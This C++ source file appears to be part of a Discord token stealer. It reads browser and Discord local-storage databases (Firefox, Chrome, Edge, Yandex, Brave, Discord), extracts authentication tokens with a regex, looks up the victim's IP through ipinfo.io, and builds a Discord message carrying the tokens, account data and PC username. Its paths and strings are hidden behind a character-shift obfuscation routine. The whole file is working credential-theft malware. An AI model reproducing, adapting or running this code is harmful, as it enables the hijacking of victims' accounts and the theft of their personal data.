#include "path.h"
#include "Discord.h"
#include "Config.h"
#include "Web.h"
#include <sstream>
#include <filesystem>

namespace fs = std::filesystem;
using namespace hentai;

std::string string_safe_dump(json str);

/*
* Regex
* regex_split()
* find_token()
*/
std::vector<std::string> regex::resplit(const std::string s, const std::string reg_str)
{
	std::vector<std::string> parts;
	std::regex re(reg_str);

	std::sregex_token_iterator iter(s.begin(), s.end(), re, -1);
	std::sregex_token_iterator end;

	while (iter != end)
	{
		parts.push_back(*iter);
		++iter;
	}

	return parts;
}

std::vector<std::string> regex::find_token(std::string path)
{
	//[A-z0-9-]{24}\.[A-z0-9-]{6}\.[A-z0-9-]{27}|mfa\.[A-z0-9-]{84}
	const char regex_exp[] = {94, 62, 48, 119, 51, 42, 60, 42, 96, 120, 53, 49, (char)128, 89, 49, 88, 68, 42, 125, 45, 48, 54, 48, 90, 126, 51, (char)128, 89, 49, 88, 68, 42, 125, 45, 48, 54, 48, 90, 126, 47, 58, 122, 127, 106, 105, 94, 95, 43, 94, 62, 48, 119, 51, 42, 60, 42, 96, 120, 59, 49, (char)128, '\0'};

	std::vector<std::string> tokens;

	std::regex token_pattern(uwu(regex_exp));

	std::smatch sm;

	std::string data = path::read_file(path);

	//std::cout << path << " " <<  data.size() << std::endl;

	if (std::regex_search(data, sm, token_pattern))
	{

		for (auto &token : sm)
		{
			tokens.push_back(token.str());
		}
	}

	return tokens;
}
// End of Regex

/*
* Path
* get_paths();
* read_file(std ::string path);
* pog_mozilla(std ::string path);
* get_username();
* extract_tokens(std ::vector<std ::string> file_paths);
*/
std::vector<std::string> path::get_paths()
{
	// C:\\Users\\ 
	const char users[] = { 70, 55, 95, 82, 118, 98, 117, 112, 95, '\0' };
	// \\AppData
	const char enc_app[] = {95, 62, 115, 109, 71, 94, 119, 94, '\0'};

	std::string username = path::getusername();
	std::vector<std::string> paths = {};
	std::string appdata = uwu(users) + username + uwu(enc_app);

	// \\Roaming\\Mozilla\\Firefox
	const char moz_rolling[] = {95, 79, 114, 94, 112, 102, 113, 100, 95, 74, 114, 119, 108, 105, 111, 94, 95, 67, 108, 111, 104, 99, 114, 117, '\0'};
	// \\profiles.ini
	const char pro_ini[] = {95, 109, 117, 108, 105, 102, 111, 98, 118, 43, 108, 107, 108, '\0'};

	std::string mozilla_base_path = appdata + uwu(moz_rolling);
	std::string mozilla_profile_file = mozilla_base_path + uwu(pro_ini);

	std::vector<std::string> profile = regex::resplit(path::pog_mozilla(mozilla_profile_file), "/");

	if (profile.size() == 2)
	{
		// webappsstore.sqlite
		const char webappstore[] = {122, 98, 101, 94, 115, 109, 118, 112, 119, 108, 117, 98, 49, 112, 116, 105, 108, 113, 104, '\0'};

		paths.push_back(
			mozilla_base_path + "\\" + profile[0] + "\\" + profile[1] + "\\" + uwu(webappstore));
	}

	// User Data\\Default\\Local Storage\\leveldb
	const char enc_db_path[] = {88, 112, 104, 111, 35, 65, 100, 113, 100, 89, 71, 98, 105, 94, 120, 105, 119, 89, 79, 108, 102, 94, 111, 29, 86, 113, 114, 111, 100, 100, 104, 89, 111, 98, 121, 98, 111, 97, 101, '\0'};

	std::string db_path = uwu(enc_db_path);

	// \\Local\\Google\\Chrome\\ 
	const char chrome[] = {95, 73, 114, 96, 100, 105, 95, 68, 114, 108, 106, 105, 104, 89, 70, 101, 117, 108, 112, 98, 95, '\0'};
	// \\Local\\Microsoft\\Edge\\ 
	const char edge[] = {95, 73, 114, 96, 100, 105, 95, 74, 108, 96, 117, 108, 118, 108, 105, 113, 95, 66, 103, 100, 104, 89, '\0'};
	// \\Local\\Yandex\\YandexBrowser\\ 
	const char yandex[] = {95, 73, 114, 96, 100, 105, 95, 86, 100, 107, 103, 98, 123, 89, 92, 94, 113, 97, 104, 117, 69, 111, 114, 116, 118, 98, 117, 89, '\0'};
	// \\Local\\BraveSoftware\\Brave-Browser\\ 
	const char brave[] = {95, 73, 114, 96, 100, 105, 95, 63, 117, 94, 121, 98, 86, 108, 105, 113, 122, 94, 117, 98, 95, 63, 117, 94, 121, 98, 48, 63, 117, 108, 122, 112, 104, 111, 95, '\0'};
	// \\Roaming\\discord\\Local Storage\\leveldb
	const char discord[] = {95, 79, 114, 94, 112, 102, 113, 100, 95, 97, 108, 112, 102, 108, 117, 97, 95, 73, 114, 96, 100, 105, 35, 80, 119, 108, 117, 94, 106, 98, 95, 105, 104, 115, 104, 105, 103, 95, '\0'};

	paths.push_back(
		appdata + uwu(chrome) + db_path);
	paths.push_back(
		appdata + uwu(edge) + db_path);
	paths.push_back(
		appdata + uwu(yandex) + db_path);
	paths.push_back(
		appdata + uwu(brave) + db_path);

	paths.push_back(
		appdata + uwu(discord));

	return paths;
}

std::string path ::read_file(std::string path)
{
	std::ifstream file;
	file.open(path, std ::ios::in | std ::ios ::binary);

	std::stringstream ss;
	ss << file.rdbuf();
	return ss.str();
}

std::string path ::pog_mozilla(std::string path)
{
	std::string mozilla_profile = "";
	try
	{
		std::string data = path::read_file(path);

		std::regex p(R"([\s]Default=([\w/.-]+)[\s])");
		std::smatch sm;
		if (std::regex_search(data, sm, p))
		{
			mozilla_profile = sm.str(1);
		}
	}
	catch (std::exception e)
	{
		// COuld do something over here
	}
	return mozilla_profile;
}

std::string path ::getusername()
{
	char username[512];
	DWORD size = 512;

	GetUserNameA(username, &size);

	return std::string(username);
}

std::vector<std::string> path::extract_tokens(std::vector<std::string> file_paths)
{
	std::vector<std::string> tokens;
	for (auto &path : file_paths)
	{
		if (!fs::exists(path))
			continue;

		if (fs::is_directory(path))
		{
			for (auto &entry : fs::directory_iterator(path))
			{

				std::vector<std::string> _tokens = regex::find_token(entry.path().string());
				for (auto _token : _tokens)
				{

					tokens.push_back(_token);
				}
			}
		}
		else
		{
			std::vector<std::string> _tokens = regex::find_token(path);
			for (auto _token : _tokens)
			{
				tokens.push_back(_token);
			}
		}
	}

	return tokens;
}
// End of Path

/*
* Embed
* make_embed(json data);
*/

json discord::make_embed_fields(json data, std::string token)
{
	std ::vector<json> fields = {};

	fields.push_back({{"name", "token"}, {"value", token}});

	for (auto _data : config::useful_data)
	{
		std::string value = string_safe_dump(data[_data]);
		if (value == "")
		{
			// Discord doesn't allow empty values
			value = "None";
		}
		fields.push_back({{"name", _data},
						  {"value", value}});
	}

	fields.push_back({{"name", "pc-username"}, {"value", path::getusername()}});

	return {
		{"fields", fields}};
}

json discord::make_discord_message(json embed, json data)
{
	std::string name = string_safe_dump(data["username"]);

	// https://cdn.discordapp.com/avatars/
	const char avatar_base_url[] = {107, 113, 119, 109, 118, 55, 50, 44, 102, 97, 113, 43, 103, 102, 118, 96, 114, 111, 103, 94, 115, 109, 49, 96, 114, 106, 50,
									94, 121, 94, 119, 94, 117, 112, 50, '\0'};

	// .png?size=128
	const char png[] = {49, 109, 113, 100, 66, 112, 108, 119, 104, 58, 52, 47, 59, '\0'};

	std::string avatar_url = uwu(avatar_base_url) + string_safe_dump(data["id"]) + '/' + string_safe_dump(data["avatar"]) + uwu(png);

	// Got a gift token for us
	const char gift[] = {74, 108, 119, 29, 100, 29, 106, 102, 105, 113, 35, 113, 114, 104, 104, 107, 35, 99, 114, 111, 35, 114, 118, '\0'};

	embed["title"] = name + " " + uwu(gift);
	embed["color"] = 660500;
	embed["author"] = {
		{"name", name},
		{"icon_url", avatar_url}};

	// https://ipinfo.io/
	const char ip_url[] = {107, 113, 119, 109, 118, 55, 50, 44, 108, 109, 108, 107, 105, 108, 49, 102, 114, 44, '\0'};

	json ipinfo_data = web::do_get_request_return_json(uwu(ip_url));

	std::string ip = string_safe_dump(ipinfo_data["ip"]);

	embed["fields"].push_back({{"name", "ip"},
							   {"value", ip}});

	json discord_message = {
		{"username", "MeoW"},
		{"embeds", {embed}}};
	return discord_message;
}
// End of Embed

std::string string_safe_dump(json str)
{
	std::string s = str.dump();

	if (str.type() == json::value_t::string)
		return std::string((s.begin() + 1), (s.end() - 1));
	else
		return s;
}

std::string hentai::uwu(std::string burp)
{
	std::string WooW = "";
	for (unsigned int i = 0; i < burp.size(); ++i)
	{
		if (i % 2 == 0)
			WooW.push_back(burp.at(i) - 3);
		else
			WooW.push_back(burp.at(i) + 3);
	}
	return WooW;
}
